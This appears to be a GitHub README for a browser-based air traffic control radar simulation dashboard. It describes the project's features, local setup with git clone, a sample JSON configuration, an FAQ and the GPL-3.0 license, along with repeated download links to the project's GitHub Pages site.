# ATC Radar v2026 - Flight Simulation Dashboard

> **ATC Radar v2026 is a browser-based air traffic control monitoring suite featuring real-time radar graphics, telemetry tracking, and event journaling.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millerfelix1981/atc-radar-2026-flight-hub?style=flat-square)](https://github.com/millerfelix1981/atc-radar-2026-flight-hub)

---

<p align="center">
  <a href="https://millerfelix1981.github.io/atc-radar-2026-flight-hub/">
    <img src="https://img.shields.io/badge/Download-ATC%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download ATC Radar">
  </a>
</p>

> **[Download Latest Build - ATC Radar v2026](https://millerfelix1981.github.io/atc-radar-2026-flight-hub/)**

---

[Download Latest Build](https://millerfelix1981.github.io/atc-radar-2026-flight-hub/)

---

## Overview

ATC Radar delivers an authentic air traffic management interface powered by standard web technologies (HTML, JavaScript, and HTML5 Canvas). It renders synthetic airspace activity on a primary radar scope while displaying telemetry details and operational events in companion panels.

This software serves effectively as an interactive display for simulation environments, software demonstrations, or virtual aviation training. The user interface prioritizes complete airspace awareness through synchronized components: an active sweep radar, an aircraft roster, an individual target inspector, and a live message stream.

---

## Core Capabilities

- High-performance Canvas renderer producing sweeping radar sweeps and target motion trails
- Real-time aircraft inventory showing high-level flight states
- Target detail view offering granular metrics for selected aircraft
- System activity feed recording real-time state transitions and updates
- State-based filtering options to isolate specific airborne targets
- Variable time compression controls to accelerate or decelerate the simulation pace
- Built-in synthetic flight engine providing offline test scenarios

---

## Getting Started

To launch the dashboard locally, retrieve the source files and open the main entry point:

1. Fetch the source code:
   git clone https://github.com/millerfelix1981/atc-radar-2026-flight-hub.git
2. Navigate into the source directory:
   cd atc-radar
3. Launch the primary HTML file directly inside any compatible web browser or host the directory via an HTTP server.

For local development or testing, serving the directory over a static local web server provides the most consistent browser experience.

---

## Operational Workflow

Launching the application initiates the simulation engine immediately. The central scope plots moving traffic while peripheral panels sync with ongoing airspace events.

Recommended usage sequence:
- Load the application inside your web browser
- Monitor target vectors as the radar beam completes its rotation
- Click an aircraft entry to bring up its complete telemetry card
- Apply flight status filters to isolate specific categories of air traffic
- Modify the tick rate to evaluate fast or slow traffic scenarios
- Observe real-time system alerts generated in the operational log

---

## System Configuration

Behavioral parameters reside within the client-side scripts included in the repository. Adjusting variables in the main script file or asset settings allows customized control over display defaults and data flows.

Example configuration schema:

```json
{
  "simulationSpeed": "normal",
  "statusFilter": "all",
  "radarTrailLength": 5
}
```

Edit these fields within the application codebase to adjust visual persistence, display filters, or simulation pacing.

---

## Prerequisites

- Any current web browser supporting HTML5 features, modern ECMAScript, and Canvas APIs
- Standard file access rights or a lightweight HTTP web server
- Zero external runtime dependencies or binary setup routines
- Adequate screen resolution to display the radar scope alongside the monitoring feeds

---

## Frequently Asked Questions

**What is required to run the application?**  
Simply open the entry file in a browser, or deliver the folder via a local web server if required by your environment.

**Does this stream live ADS-B or real-world aviation feeds?**  
No, the application operates purely on pre-programmed simulated flight datasets.

**Can I modify how the simulation runs?**  
Yes, simulation velocity, display filters, and radar options can be adjusted inside the application scripts.

**Why are elements missing or misaligned on my screen?**  
Ensure your web browser supports HTML5 Canvas and that all repository scripts loaded cleanly without broken path references.

**Where can I find updated releases?**  
Use the project download link above to grab the latest static build or check the commit history.

---

## Licensing

Distributed under the terms of the GNU General Public License v3.0. Refer to the [LICENSE](LICENSE) file for the complete text.
